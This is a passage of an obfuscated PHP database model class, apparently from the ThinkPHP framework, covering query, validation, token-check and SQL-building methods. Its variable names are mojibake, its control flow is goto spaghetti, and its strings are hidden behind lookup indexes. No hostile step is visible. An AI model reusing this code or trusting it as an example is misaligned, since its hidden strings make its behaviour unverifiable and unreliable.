Eİ†¦ó‘®: } protected function _options_filter(&$DÓ°ÎºÙ†) { } protected function _parseType(&$Fäºó»ƒí, $aÊ¤¬§éÜ§) { $FŒ»„ƒ×Å÷ =& $_SERVER[Ç³Íß¦Ó]; if (empty($this->options[$FŒ»„ƒ×Å÷[282]][$FŒ»„ƒ×Å÷[4] . $aÊ¤¬§éÜ§])) { $CÊñ†«Ãõù = strtolower($this->fields[$FŒ»„ƒ×Å÷[249]][$aÊ¤¬§éÜ§]); if (!1 !== strpos($CÊñ†«Ãõù, $FŒ»„ƒ×Å÷[283])) { } elseif (!1 === strpos($CÊñ†«Ãõù, $FŒ»„ƒ×Å÷[284]) && !1 !== strpos($CÊñ†«Ãõù, $FŒ»„ƒ×Å÷[285])) { $Fäºó»ƒí[$aÊ¤¬§éÜ§] = intval($Fäºó»ƒí[$aÊ¤¬§éÜ§]); } elseif (!1 !== strpos($CÊñ†«Ãõù, $FŒ»„ƒ×Å÷[286]) || !1 !== strpos($CÊñ†«Ãõù, $FŒ»„ƒ×Å÷[287])) { $Fäºó»ƒí[$aÊ¤¬§éÜ§] = floatval($Fäºó»ƒí[$aÊ¤¬§éÜ§]); } elseif (!1 !== strpos($CÊñ†«Ãõù, $FŒ»„ƒ×Å÷[288])) { $Fäºó»ƒí[$aÊ¤¬§éÜ§] = (bool) $Fäºó»ƒí[$aÊ¤¬§éÜ§]; } } } public function find($cÏ‚ÕÁ¦”Û = array()) { goto fĞÌœÈÓ×¸; eˆ•´ŒŞè¤: $cÏ‚ÕÁ¦”Û = $this->_parseOptions(); $D™¹‘ÎŸÅ = $this->db->select($cÏ‚ÕÁ¦”Û); if (!1 === $D™¹‘ÎŸÅ) { return !1; } goto EÔ†Õ Ùğæ; f­¶¥ôâ: if (!empty($this->options[$cñˆ·ÀÉÎ[290]])) { return $this->returnResult($this->data, $this->options[$cñˆ·ÀÉÎ[290]]); } return $this->data; goto b‹ç¦·„; EÔ†Õ Ùğæ: if (empty($D™¹‘ÎŸÅ)) { return null; } $this->data = $D™¹‘ÎŸÅ[0]; $this->_afterFind($this->data, $cÏ‚ÕÁ¦”Û); goto f­¶¥ôâ; fĞÌœÈÓ×¸: $cñˆ·ÀÉÎ =& $_SERVER[Ç³Íß¦Ó]; if (is_numeric($cÏ‚ÕÁ¦”Û) || is_string($cÏ‚ÕÁ¦”Û)) { $AÈ±…òˆˆ²[$this->getPk()] = intval($cÏ‚ÕÁ¦”Û); $this->options[$cñˆ·ÀÉÎ[272]] = $AÈ±…òˆˆ²; } $this->options[$cñˆ·ÀÉÎ[289]] = 1; goto eˆ•´ŒŞè¤; b‹ç¦·„: } protected function _afterFind(&$E‹ØÄ‰÷Ñš, $Aìğ¦õŒØ) { } protected function returnResult($d—…¢—²•, $C°ÅãÊ²Ñ = '') { $E‡ê–©Ñ =& $_SERVER[Ç³Íß¦Ó]; if ($C°ÅãÊ²Ñ) { if (is_callable($C°ÅãÊ²Ñ)) { return call_user_func($C°ÅãÊ²Ñ, $d—…¢—²•); } switch (strtolower($C°ÅãÊ²Ñ)) { case $E‡ê–©Ñ[291]: return json_encode($d—…¢—²•); case $E‡ê–©Ñ[292]: return xml_encode($d—…¢—²•); } } return $d—…¢—²•; } public function parseFieldsMap($Cä“¾ÃÍí÷, $eÕÈµŠ•ËË = 1) { if (!empty($this->_map)) { foreach ($this->_map as $d‚äç®Æ“ => $BœêĞğÂ—) { if ($eÕÈµŠ•ËË == 1) { if (isset($Cä“¾ÃÍí÷[$BœêĞğÂ—])) { $Cä“¾ÃÍí÷[$d‚äç®Æ“] = $Cä“¾ÃÍí÷[$BœêĞğÂ—]; unset($Cä“¾ÃÍí÷[$BœêĞğÂ—]); } } else { if (isset($Cä“¾ÃÍí÷[$d‚äç®Æ“])) { $Cä“¾ÃÍí÷[$BœêĞğÂ—] = $Cä“¾ÃÍí÷[$d‚äç®Æ“]; unset($Cä“¾ÃÍí÷[$d‚äç®Æ“]); } } } } return $Cä“¾ÃÍí÷; } public function setField($dè“Õ®âË, $d¯–‘óì¸ = '') { if (is_array($dè“Õ®âË)) { $aÃÇ¤Œ¬ˆ = $dè“Õ®âË; } else { $aÃÇ¤Œ¬ˆ[$dè“Õ®âË] = $d¯–‘óì¸; } return $this->save($aÃÇ¤Œ¬ˆ); } public function setAdd($dÆ§æƒ, $Fõì•Ã‰ë® = 1) { $f“Î±Ú·ˆî =& $_SERVER[Ç³Íß¦Ó]; $FÎÂó×Åóà = $dÆ§æƒ . $f“Î±Ú·ˆî[293] . $Fõì•Ã‰ë®; if ($Fõì•Ã‰ë® < 0) { $FÎÂó×Åóà = $dÆ§æƒ . $Fõì•Ã‰ë®; } return $this->setField($dÆ§æƒ, array($f“Î±Ú·ˆî[294], $FÎÂó×Åóà)); } public function getField($aØµ¹›, $FŞî‘Ûğ· = null) { $Aî– ­ï¯‹ =& $_SERVER[Ç³Íß¦Ó]; $C‘ÈªŞ¢Ï[$Aî– ­ï¯‹[270]] = $aØµ¹›; $C‘ÈªŞ¢Ï = $this->_parseOptions($C‘ÈªŞ¢Ï); $aØµ¹› = trim($aØµ¹›); if (strpos($aØµ¹›, $Aî– ­ï¯‹[47])) { if (!isset($C‘ÈªŞ¢Ï[$Aî– ­ï¯‹[289]])) { $C‘ÈªŞ¢Ï[$Aî– ­ï¯‹[289]] = is_numeric($FŞî‘Ûğ·) ? $FŞî‘Ûğ· : $Aî– ­ï¯‹[33]; } $B…ÆÒÔå„İ = $this->db->select($C‘ÈªŞ¢Ï); if (!empty($B…ÆÒÔå„İ)) { goto bŸ¶à¡İÒï; aÒŸ¦Ø¼İ…: foreach ($B…ÆÒÔå„İ as $DÉ¡ä‰—ó) { $A¢Ê‡ÜĞµó = $DÉ¡ä‰—ó[$Eæ‘ñ¨Ê»]; if (2 == $ešˆÎÊÛÛÙ) { $CšÄš‹®Ô[$A¢Ê‡ÜĞµó] = $DÉ¡ä‰—ó[$cƒ³ì’áÚ½]; } else { $CšÄš‹®Ô[$A¢Ê‡ÜĞµó] = is_string($FŞî‘Ûğ·) ? implode($FŞî‘Ûğ·, $DÉ¡ä‰—ó) : $DÉ¡ä‰—ó; } } return $CšÄš‹®Ô; goto B§”˜ì°øÌ; d—ãÖ§Æäö: $cƒ³ì’áÚ½ = array_shift($aØµ¹›); $CšÄš‹®Ô = array(); $ešˆÎÊÛÛÙ = count($D½™ç¸òµç); goto aÒŸ¦Ø¼İ…; bŸ¶à¡İÒï: $D½™ç¸òµç = explode($Aî– ­ï¯‹[47], $aØµ¹›); $aØµ¹› = array_keys($B…ÆÒÔå„İ[0]); $Eæ‘ñ¨Ê» = array_shift($aØµ¹›); goto d—ãÖ§Æäö; B§”˜ì°øÌ: } } else { if (!0 !== $FŞî‘Ûğ·) { $C‘ÈªŞ¢Ï[$Aî– ­ï¯‹[289]] = is_numeric($FŞî‘Ûğ·) ? $FŞî‘Ûğ· : 1; } if ($FŞî‘Ûğ· === $Aî– ­ï¯‹[252]) { unset($C‘ÈªŞ¢Ï[$Aî– ­ï¯‹[289]]); } $DÉ¡ä‰—ó = $this->db->select($C‘ÈªŞ¢Ï); if (!empty($DÉ¡ä‰—ó)) { if ($FŞî‘Ûğ· === $Aî– ­ï¯‹[252]) { return reset($DÉ¡ä‰—ó[0]); } if (!0 !== $FŞî‘Ûğ· && 1 == $C‘ÈªŞ¢Ï[$Aî– ­ï¯‹[289]]) { return reset($DÉ¡ä‰—ó[0]); } foreach ($DÉ¡ä‰—ó as $d“åÙ‰•) { $d‚Û´Š³‚Ñ[] = $d“åÙ‰•[$aØµ¹›]; } return $d‚Û´Š³‚Ñ; } } return null; } public function create($aÄ‹£¶óÄ¿ = '', $C¶ÇÑß¥Ó = '') { goto Cç–÷İ©†Ç; D·¤ÌÔ‚Ó: return $aÄ‹£¶óÄ¿; goto cùŸ…—‡æù; f‘À””ÛÃ´: $aÄ‹£¶óÄ¿ = $this->parseFieldsMap($aÄ‹£¶óÄ¿, 0); $C¶ÇÑß¥Ó = $C¶ÇÑß¥Ó ? $C¶ÇÑß¥Ó : (!empty($aÄ‹£¶óÄ¿[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$d›ä¢×¨ŠÇ[270]])) { $CÇ”¿‰¹ÆÒ = $this->options[$d›ä¢×¨ŠÇ[270]]; unset($this->options[$d›ä¢×¨ŠÇ[270]]); } elseif ($C¶ÇÑß¥Ó == THINK_MODEL_INSERT && isset($this->insertFields)) { $CÇ”¿‰¹ÆÒ = $this->insertFields; } elseif ($C¶ÇÑß¥Ó == THINK_MODEL_UPDATE && isset($this->updateFields)) { $CÇ”¿‰¹ÆÒ = $this->updateFields; } goto BÖÜÕ‚÷ ÷; Cç–÷İ©†Ç: $d›ä¢×¨ŠÇ =& $_SERVER[Ç³Íß¦Ó]; if (empty($aÄ‹£¶óÄ¿)) { $aÄ‹£¶óÄ¿ = $_POST; } elseif (is_object($aÄ‹£¶óÄ¿)) { $aÄ‹£¶óÄ¿ = get_object_vars($aÄ‹£¶óÄ¿); } if (empty($aÄ‹£¶óÄ¿) || !is_array($aÄ‹£¶óÄ¿)) { $this->error = think_lang($d›ä¢×¨ŠÇ[268]); return !1; } goto f‘À””ÛÃ´; AÕ¤ÈèºÅ: if ($this->autoCheckFields) { $CÇ”¿‰¹ÆÒ = $this->getDbFields(); foreach ($aÄ‹£¶óÄ¿ as $c˜‰³ë½… => $bã¨ŞĞ¤) { if (!in_array($c˜‰³ë½…, $CÇ”¿‰¹ÆÒ)) { unset($aÄ‹£¶óÄ¿[$c˜‰³ë½…]); } elseif (MAGIC_QUOTES_GPC && is_string($bã¨ŞĞ¤)) { $aÄ‹£¶óÄ¿[$c˜‰³ë½…] = stripslashes($bã¨ŞĞ¤); } } } $this->autoOperation($aÄ‹£¶óÄ¿, $C¶ÇÑß¥Ó); $this->data = $aÄ‹£¶óÄ¿; goto D·¤ÌÔ‚Ó; BÖÜÕ‚÷ ÷: if (isset($CÇ”¿‰¹ÆÒ)) { if (is_string($CÇ”¿‰¹ÆÒ)) { $CÇ”¿‰¹ÆÒ = explode($d›ä¢×¨ŠÇ[47], $CÇ”¿‰¹ÆÒ); } if (think_config($d›ä¢×¨ŠÇ[295])) { $CÇ”¿‰¹ÆÒ[] = think_config($d›ä¢×¨ŠÇ[296]); } foreach ($aÄ‹£¶óÄ¿ as $c˜‰³ë½… => $bã¨ŞĞ¤) { if (!in_array($c˜‰³ë½…, $CÇ”¿‰¹ÆÒ)) { unset($aÄ‹£¶óÄ¿[$c˜‰³ë½…]); } } } if (!$this->autoValidation($aÄ‹£¶óÄ¿, $C¶ÇÑß¥Ó)) { return !1; } if (!$this->autoCheckToken($aÄ‹£¶óÄ¿)) { $this->error = think_lang($d›ä¢×¨ŠÇ[297]); return !1; } goto AÕ¤ÈèºÅ; cùŸ…—‡æù: } public function autoCheckToken($DÒ“éáßõ) { $a­–ªÒÓçñ =& $_SERVER[Ç³Íß¦Ó]; if (isset($this->options[$a­–ªÒÓçñ[298]]) && !$this->options[$a­–ªÒÓçñ[298]]) { return !0; } if (think_config($a­–ªÒÓçñ[295])) { $bëæŞƒ”¾ = think_config($a­–ªÒÓçñ[296]); if (!isset($DÒ“éáßõ[$bëæŞƒ”¾]) || Session::get($bëæŞƒ”¾)) { return !1; } list($eà ®¢ËŸ, $bÓİ¤Û˜¬ä) = explode($a­–ªÒÓçñ[71], $DÒ“éáßõ[$bëæŞƒ”¾]); if ($bÓİ¤Û˜¬ä && Session::get($bëæŞƒ”¾ . $a­–ªÒÓçñ[95] . $eà ®¢ËŸ) === $bÓİ¤Û˜¬ä) { Session::remove($bëæŞƒ”¾ . $a­–ªÒÓçñ[95] . $eà ®¢ËŸ); return !0; } if (think_config($a­–ªÒÓçñ[299])) { Session::remove($bëæŞƒ”¾ . $a­–ªÒÓçñ[95] . $eà ®¢ËŸ); } return !1; } return !0; } public function regex($cÂƒº¦Éò„, $Aš¦ÎÈŸé) { $eÓ‰¤¥‰“ =& $_SERVER[Ç³Íß¦Ó]; $aòœ¢Ø¨© = array($eÓ‰¤¥‰“[300] => $eÓ‰¤¥‰“[301], $eÓ‰¤¥‰“[302] => $eÓ‰¤¥‰“[303], $eÓ‰¤¥‰“[304] => $eÓ‰¤¥‰“[305], $eÓ‰¤¥‰“[306] => $eÓ‰¤¥‰“[307], $eÓ‰¤¥‰“[308] => $eÓ‰¤¥‰“[309], $eÓ‰¤¥‰“[310] => $eÓ‰¤¥‰“[311], $eÓ‰¤¥‰“[312] => $eÓ‰¤¥‰“[313], $eÓ‰¤¥‰“[287] => $eÓ‰¤¥‰“[314], $eÓ‰¤¥‰“[315] => $eÓ‰¤¥‰“[316]); if (isset($aòœ¢Ø¨©[strtolower($Aš¦ÎÈŸé)])) { $Aš¦ÎÈŸé = $aòœ¢Ø¨©[strtolower($Aš¦ÎÈŸé)]; } return preg_match($Aš¦ÎÈŸé, $cÂƒº¦Éò„) === 1; } private function autoOperation(&$cøŸçµÙâ¤, $D¡é¢‘³ñ) { $Dé®âÎéÊÏ =& $_SERVER[Ç³Íß¦Ó]; if (!empty($this->options[$Dé®âÎéÊÏ[317]])) { $Fà­öŠéŸ² = $this->options[$Dé®âÎéÊÏ[317]]; unset($this->options[$Dé®âÎéÊÏ[317]]); } elseif (!empty($this->_auto)) { $Fà­öŠéŸ² = $this->_auto; } if (isset($Fà­öŠéŸ²)) { foreach ($Fà­öŠéŸ² as $A¤á”ïò) { if (empty($A¤á”ïò[2])) { $A¤á”ïò[2] = THINK_MODEL_INSERT; } if ($D¡é¢‘³ñ == $A¤á”ïò[2] || $A¤á”ïò[2] == THINK_MODEL_BOTH) { switch (trim($A¤á”ïò[3])) { case $Dé®âÎéÊÏ[318]: case $Dé®âÎéÊÏ[319]: $Fã‚·†…Ÿæ = isset($A¤á”ïò[4]) ? (array) $A¤á”ïò[4] : array(); if (isset($cøŸçµÙâ¤[$A¤á”ïò[0]])) { array_unshift($Fã‚·†…Ÿæ, $cøŸçµÙâ¤[$A¤á”ïò[0]]); } if ($Dé®âÎéÊÏ[318] == $A¤á”ïò[3]) { $cøŸçµÙâ¤[$A¤á”ïò[0]] = call_user_func_array($A¤á”ïò[1], $Fã‚·†…Ÿæ); } else { $cøŸçµÙâ¤[$A¤á”ïò[0]] = call_user_func_array(array(&$this, $A¤á”ïò[1]), $Fã‚·†…Ÿæ); } break; case $Dé®âÎéÊÏ[270]: $cøŸçµÙâ¤[$A¤á”ïò[0]] = $cøŸçµÙâ¤[$A¤á”ïò[1]]; break; case $Dé®âÎéÊÏ[320]: if ($Dé®âÎéÊÏ[33] === $cøŸçµÙâ¤[$A¤á”ïò[0]]) { unset($cøŸçµÙâ¤[$A¤á”ïò[0]]); } break; case $Dé®âÎéÊÏ[321]: default: $cøŸçµÙâ¤[$A¤á”ïò[0]] = $A¤á”ïò[1]; } if (!1 === $cøŸçµÙâ¤[$A¤á”ïò[0]]) { unset($cøŸçµÙâ¤[$A¤á”ïò[0]]); } } } } return $cøŸçµÙâ¤; } protected function autoValidation($FØÇ¥ªÃêâ, $f’éìï÷ìÃ) { $EìÚ¯¿–ƒ =& $_SERVER[Ç³Íß¦Ó]; if (!empty($this->options[$EìÚ¯¿–ƒ[322]])) { $cô÷Êƒ›¾ = $this->options[$EìÚ¯¿–ƒ[322]]; unset($this->options[$EìÚ¯¿–ƒ[322]]); } elseif (!empty($this->_validate)) { $cô÷Êƒ›¾ = $this->_validate; } if (isset($cô÷Êƒ›¾)) { if ($this->patchValidate) { $this->error = array(); } foreach ($cô÷Êƒ›¾ as $A¨øšóº† => $Fù†¡ïƒøà) { if (empty($Fù†¡ïƒøà[5]) || $Fù†¡ïƒøà[5] == THINK_MODEL_BOTH || $Fù†¡ïƒøà[5] == $f’éìï÷ìÃ) { if (0 == strpos($Fù†¡ïƒøà[2], $EìÚ¯¿–ƒ[323]) && strpos($Fù†¡ïƒøà[2], $EìÚ¯¿–ƒ[324])) { $Fù†¡ïƒøà[2] = think_lang(substr($Fù†¡ïƒøà[2], 2, -1)); } $Fù†¡ïƒøà[3] = isset($Fù†¡ïƒøà[3]) ? $Fù†¡ïƒøà[3] : THINK_EXISTS_VALIDATE; $Fù†¡ïƒøà[4] = isset($Fù†¡ïƒøà[4]) ? $Fù†¡ïƒøà[4] : $EìÚ¯¿–ƒ[325]; switch ($Fù†¡ïƒøà[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($FØÇ¥ªÃêâ, $Fù†¡ïƒøà)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($EìÚ¯¿–ƒ[33] != trim($FØÇ¥ªÃêâ[$Fù†¡ïƒøà[0]])) { if (!1 === $this->_validationField($FØÇ¥ªÃêâ, $Fù†¡ïƒøà)) { return !1; } } break; default: if (isset($FØÇ¥ªÃêâ[$Fù†¡ïƒøà[0]])) { if (!1 === $this->_validationField($FØÇ¥ªÃêâ, $Fù†¡ïƒøà)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($F‰ù™ğÜ¾, $f’ğ¬ê©¤ï) { if (!1 === $this->_validationFieldItem($F‰ù™ğÜ¾, $f’ğ¬ê©¤ï)) { if ($this->patchValidate) { $this->error[$f’ğ¬ê©¤ï[0]] = $f’ğ¬ê©¤ï[2]; } else { $this->error = $f’ğ¬ê©¤ï[2]; return !1; } } return; } protected function _validationFieldItem($CÏÁ¢Ÿˆ, $F“ªÁùïë…) { $bƒ¶¤É«ˆê =& $_SERVER[Ç³Íß¦Ó]; switch (strtolower(trim($F“ªÁùïë…[4]))) { case $bƒ¶¤É«ˆê[318]: case $bƒ¶¤É«ˆê[319]: $b ‹ù¢ä‹á = isset($F“ªÁùïë…[6]) ? (array) $F“ªÁùïë…[6] : array(); if (is_string($F“ªÁùïë…[0]) && strpos($F“ªÁùïë…[0], $bƒ¶¤É«ˆê[47])) { $F“ªÁùïë…[0] = explode($bƒ¶¤É«ˆê[47], $F“ªÁùïë…[0]); } if (is_array($F“ªÁùïë…[0])) { foreach ($F“ªÁùïë…[0] as $FŸª‹õÄ¸£) { $d½õ§„Ú”[$FŸª‹õÄ¸£] = $CÏÁ¢Ÿˆ[$FŸª‹õÄ¸£]; } array_unshift($b ‹ù¢ä‹á, $d½õ§„Ú”); } else { array_unshift($b ‹ù¢ä‹á, $CÏÁ¢Ÿˆ[$F“ªÁùïë…[0]]); } if ($bƒ¶¤É«ˆê[318] == $F“ªÁùïë…[4]) { return call_user_func_array($F“ªÁùïë…[1], $b ‹ù¢ä‹á); } else { return call_user_func_array(array(&$this, $F“ªÁùïë…[1]), $b ‹ù¢ä‹á); } case $bƒ¶¤É«ˆê[326]: return $CÏÁ¢Ÿˆ[$F“ªÁùïë…[0]] == $CÏÁ¢Ÿˆ[$F“ªÁùïë…[1]]; case $bƒ¶¤É«ˆê[327]: if (is_string($F“ªÁùïë…[0]) && strpos($F“ªÁùïë…[0], $bƒ¶¤É«ˆê[47])) { $F“ªÁùïë…[0] = explode($bƒ¶¤É«ˆê[47], $F“ªÁùïë…[0]); } $FšÒ·í…öÎ = array(); if (is_array($F“ªÁùïë…[0])) { foreach ($F“ªÁùïë…[0] as $FŸª‹õÄ¸£) { $FšÒ·í…öÎ[$FŸª‹õÄ¸£] = $CÏÁ¢Ÿˆ[$FŸª‹õÄ¸£]; } } else { $FšÒ·í…öÎ[$F“ªÁùïë…[0]] = $CÏÁ¢Ÿˆ[$F“ªÁùïë…[0]]; } if (!empty($CÏÁ¢Ÿˆ[$this->getPk()])) { $FšÒ·í…öÎ[$this->getPk()] = array($bƒ¶¤É«ˆê[328], $CÏÁ¢Ÿˆ[$this->getPk()]); } if ($this->where($FšÒ·í…öÎ)->find()) { return !1; } return !0; default: return $this->check($CÏÁ¢Ÿˆ[$F“ªÁùïë…[0]], $F“ªÁùïë…[1], $F“ªÁùïë…[4]); } } public function check($BïÛ‰¢…ÙÀ, $b—˜‡ÊÃ Ÿ, $d¯Ì–Øê×“ = "\162\145\x67\x65\170") { $f›ñÚùòÅ’ =& $_SERVER[Ç³Íß¦Ó]; $d¯Ì–Øê×“ = strtolower(trim($d¯Ì–Øê×“)); switch ($d¯Ì–Øê×“) { case $f›ñÚùòÅ’[7]: case $f›ñÚùòÅ’[329]: $EœÂÔ®¤ê« = is_array($b—˜‡ÊÃ Ÿ) ? $b—˜‡ÊÃ Ÿ : explode($f›ñÚùòÅ’[47], $b—˜‡ÊÃ Ÿ); return $d¯Ì–Øê×“ == $f›ñÚùòÅ’[7] ? in_array($BïÛ‰¢…ÙÀ, $EœÂÔ®¤ê«) : !in_array($BïÛ‰¢…ÙÀ, $EœÂÔ®¤ê«); case $f›ñÚùòÅ’[330]: case $f›ñÚùòÅ’[331]: if (is_array($b—˜‡ÊÃ Ÿ)) { $Eğ®á±è = $b—˜‡ÊÃ Ÿ[0]; $eÉ…£¡©ˆ˜ = $b—˜‡ÊÃ Ÿ[1]; } else { list($Eğ®á±è, $eÉ…£¡©ˆ˜) = explode($f›ñÚùòÅ’[47], $b—˜‡ÊÃ Ÿ); } return $d¯Ì–Øê×“ == $f›ñÚùòÅ’[330] ? $BïÛ‰¢…ÙÀ >= $Eğ®á±è && $BïÛ‰¢…ÙÀ <= $eÉ…£¡©ˆ˜ : $BïÛ‰¢…ÙÀ < $Eğ®á±è || $BïÛ‰¢…ÙÀ > $eÉ…£¡©ˆ˜; case $f›ñÚùòÅ’[332]: case $f›ñÚùòÅ’[333]: return $d¯Ì–Øê×“ == $f›ñÚùòÅ’[332] ? $BïÛ‰¢…ÙÀ == $b—˜‡ÊÃ Ÿ : $BïÛ‰¢…ÙÀ != $b—˜‡ÊÃ Ÿ; case $f›ñÚùòÅ’[334]: $f¥Ó¿ï¶¹Ó = mb_strlen($BïÛ‰¢…ÙÀ, $f›ñÚùòÅ’[335]); if (strpos($b—˜‡ÊÃ Ÿ, $f›ñÚùòÅ’[47])) { list($Eğ®á±è, $eÉ…£¡©ˆ˜) = explode($f›ñÚùòÅ’[47], $b—˜‡ÊÃ Ÿ); return $f¥Ó¿ï¶¹Ó >= $Eğ®á±è && $f¥Ó¿ï¶¹Ó <= $eÉ…£¡©ˆ˜; } else { return $f¥Ó¿ï¶¹Ó == $b—˜‡ÊÃ Ÿ; } case $f›ñÚùòÅ’[336]: list($a”ç¾©¯ó, $bãÚÏ½¢×ï) = explode($f›ñÚùòÅ’[47], $b—˜‡ÊÃ Ÿ); if (!is_numeric($a”ç¾©¯ó)) { $a”ç¾©¯ó = strtotime($a”ç¾©¯ó); } if (!is_numeric($bãÚÏ½¢×ï)) { $bãÚÏ½¢×ï = strtotime($bãÚÏ½¢×ï); } return NOW_TIME >= $a”ç¾©¯ó && NOW_TIME <= $bãÚÏ½¢×ï; case $f›ñÚùòÅ’[337]: return in_array(get_client_ip(), explode($f›ñÚùòÅ’[47], $b—˜‡ÊÃ Ÿ)); case $f›ñÚùòÅ’[338]: return !in_array(get_client_ip(), explode($f›ñÚùòÅ’[47], $b—˜‡ÊÃ Ÿ)); case $f›ñÚùòÅ’[325]: default: return $this->regex($BïÛ‰¢…ÙÀ, $b—˜‡ÊÃ Ÿ); } } public function query($fº±Õ”é™Ô, $cíİÊŒïÀ = false) { $a—ÕñÎ‚äÙ =& $_SERVER[Ç³Íß¦Ó]; if (!is_bool($cíİÊŒïÀ) && !is_array($cíİÊŒïÀ)) { $cíİÊŒïÀ = func_get_args(); array_shift($cíİÊŒïÀ); } $fº±Õ”é™Ô = str_replace(array($a—ÕñÎ‚äÙ[228], $a—ÕñÎ‚äÙ[339]), $a—ÕñÎ‚äÙ[50], $fº±Õ”é™Ô); $fº±Õ”é™Ô = $this->parseSql($fº±Õ”é™Ô, $cíİÊŒïÀ); return $this->db->query($fº±Õ”é™Ô); } public function execute($e¨Ø­éÜº, $E•õ¬¨ÙöŒ = false) { if (!is_bool($E•õ¬¨ÙöŒ) && !is_array($E•õ¬¨ÙöŒ)) { $E•õ¬¨ÙöŒ = func_get_args(); array_shift($E•õ¬¨ÙöŒ); } $e¨Ø­éÜº = $this->parseSql($e¨Ø­éÜº, $E•õ¬¨ÙöŒ); return $this->db->execute($e¨Ø­éÜº); } protected function parseSql($D„¨£…Ø»§, $BÄ’ÄùóÕ) { $FÕö×©ïÉ  =& $_SERVER[Ç³Íß¦Ó]; if (!0 === $BÄ’ÄùóÕ) { $D§“•ê˜Š = $this->_parseOptions(); $D„¨£…Ø»§ = $this->db->parseSql($D„¨£…Ø»§, $D§“•ê˜Š); } elseif (is_array($BÄ’ÄùóÕ)) { $BÄ’ÄùóÕ = array_map(array($this->db, $FÕö×©ïÉ [340]), $BÄ’ÄùóÕ); $D„¨£…Ø»§ = vsprintf($D„¨£…Ø»§, $BÄ’ÄùóÕ); } else { $D„¨£…Ø»§ = strtr($D„¨£…Ø»§, array($FÕö×©ïÉ [341] => $this->getTableName(), $FÕö×©ïÉ [342] => think_config($FÕö×©ïÉ [241]))); } $this->db->setModel($this->name); return $D„¨£…Ø»§; } public function db($DìŒŸíÌ§Ş = '', $D‘˜¢Õ‘¢Ù = '', $D¿š¯•ğ› = array()) { goto E¼óö’Ñ‰Ã; d†Æ—µ¯†Ú: $FÂ–Å¬Ş“õ[$DìŒŸíÌ§Ş] = $D‘˜¢Õ‘¢Ù; $this->db = $bõªö…æì[$DìŒŸíÌ§Ş]; $this->_after_db(); goto d¢Ç†„ƒ Ò; AÔ¼ï„‰¤: static $bõªö…æì = array(); if (!isset($bõªö…æì[$DìŒŸíÌ§Ş]) || isset($bõªö…æì[$DìŒŸíÌ§Ş]) && $D‘˜¢Õ‘¢Ù && $FÂ–Å¬Ş“õ[$DìŒŸíÌ§Ş] != $D‘˜¢Õ‘¢Ù) { if (!empty($D‘˜¢Õ‘¢Ù) && is_string($D‘˜¢Õ‘¢Ù) && !1 === strpos($D‘˜¢Õ‘¢Ù, $dŠ¯³„Á [8])) { $D‘˜¢Õ‘¢Ù = think_config($D‘˜¢Õ‘¢Ù); } $bõªö…æì[$DìŒŸíÌ§Ş] = Db::getInstance($D‘˜¢Õ‘¢Ù); } elseif (NULL === $D‘˜¢Õ‘¢Ù) { $bõªö…æì[$DìŒŸíÌ§Ş]->close(); unset($bõªö…æì[$DìŒŸíÌ§Ş]); return; } if (!empty($D¿š¯•ğ›)) { if (is_string($D¿š¯•ğ›)) { parse_str($D¿š¯•ğ›, $D¿š¯•ğ›); } foreach ($D¿š¯•ğ› as $eé†¦»é© => $B—’º£ÕœÙ) { $this->setProperty($eé†¦»é©, $B—’º£ÕœÙ); } } goto d†Æ—µ¯†Ú; E¼óö’Ñ‰Ã: $dŠ¯³„Á  =& $_SERVER[Ç³Íß¦Ó]; if ($dŠ¯³„Á [33] === $DìŒŸíÌ§Ş && $this->db) { return $this->db; } static $FÂ–Å¬Ş“õ = array(); goto AÔ¼ï„‰¤; d¢Ç†„ƒ Ò: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto F¨Ğ³ôÀ‰Ğ; F¨Ğ³ôÀ‰Ğ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Cê§é¬¶Óé = get_class($this); if ($Cê§é¬¶Óé == $_SERVER[Ç³Íß¦Ó][343]) { return $this->name; } $this->name = substr($Cê§é¬¶Óé, 0, -5); } return $this->name; } public function getTableName() { $EèÕ”Ï“ÄÑ =& $_SERVER[Ç³Íß¦Ó]; if (empty($this->trueTableName)) { $BäíöëÎ· = !empty($this->tablePrefix) ? $this->tablePrefix : $EèÕ”Ï“ÄÑ[33]; if (!empty($this->tableName)) { $BäíöëÎ· .= $this->tableName; } else { $BäíöëÎ· .= think_parse_name($this->name); } $this->trueTableName = strtolower($BäíöëÎ·); } return (!empty($this->dbName) ? $this->dbName . $EèÕ”Ï“ÄÑ[95] : $EèÕ”Ï“ÄÑ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $dâÃóº£ç =& $_SERVER[Ç³Íß¦Ó]; return isset($this->fields[$dâÃóº£ç[248]]) ? $this->fields[$dâÃóº£ç[248]] : $this->pk; } public function getDbFields() { $AÇÇ­¥§‡¦ =& $_SERVER[Ç³Íß¦Ó]; if (isset($this->options[$AÇÇ­¥§‡¦[276]])) { $e–‹ä‚›ì = $this->db->getFields($this->options[$AÇÇ­¥§‡¦[276]]); return $e–‹ä‚›ì ? array_keys($e–‹ä‚›ì) : !1; } if ($this->fields) { $e–‹ä‚›ì = $this->fields; unset($e–‹ä‚›ì[$AÇÇ­¥§‡¦[247]], $e–‹ä‚›ì[$AÇÇ­¥§‡¦[248]], $e–‹ä‚›ì[$AÇÇ­¥§‡¦[249]], $e–‹ä‚›ì[$AÇÇ­¥§‡¦[246]]); return $e–‹ä‚›ì; } return !1; } public function data($bÁÕ‹±ò = '') { $F‚„‘¡Àù =& $_SERVER[Ç³Íß¦Ó]; if ($F‚„‘¡Àù[33] === $bÁÕ‹±ò && !empty($this->data)) { return $this->data; } if (is_object($bÁÕ‹±ò)) { $bÁÕ‹±ò = get_object_vars($bÁÕ‹±ò); } elseif (is_string($bÁÕ‹±ò)) { parse_str($bÁÕ‹±ò, $bÁÕ‹±ò); } elseif (!is_array($bÁÕ‹±ò)) { think_exception(think_lang($F‚„‘¡Àù[268])); } $this->data = $bÁÕ‹±ò; return $this; } public function join($cÙŠ·ˆÃ) { $a·ƒïŸ¯«… =& 